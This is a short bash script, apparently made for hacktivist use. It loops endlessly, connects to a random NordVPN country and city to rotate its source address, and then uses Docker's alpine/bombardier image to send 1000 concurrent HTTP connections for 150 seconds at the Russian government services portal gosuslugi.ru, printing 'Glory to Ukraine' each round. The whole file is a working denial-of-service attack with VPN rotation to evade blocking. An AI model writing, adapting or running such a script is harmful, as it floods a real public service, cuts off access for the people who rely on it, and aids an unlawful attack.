

while true
do
function ref { # Random Element From
  declare -a array=("$@")
  r=$((RANDOM % ${#array[@]}))
  printf "%s\n" "${array[$r]}"
}
country=$(ref $(nordvpn countries))
city=$(ref $(nordvpn cities "$country"))
while [ ${#city} -le 7 ]
do
  country=$(ref $(nordvpn countries))
  city=$(ref $(nordvpn cities "$country"))
done

echo '-------start----------'
echo '-------Glory to Ukraine----------'
echo $country
echo $city
nordvpn connect $country
sleep 5
docker run -ti --rm alpine/bombardier -c 1000 -d 150s -l https://www.gosuslugi.ru
echo $(docker ps -aqf "name=suspicious_shtern")
sleep 10
done
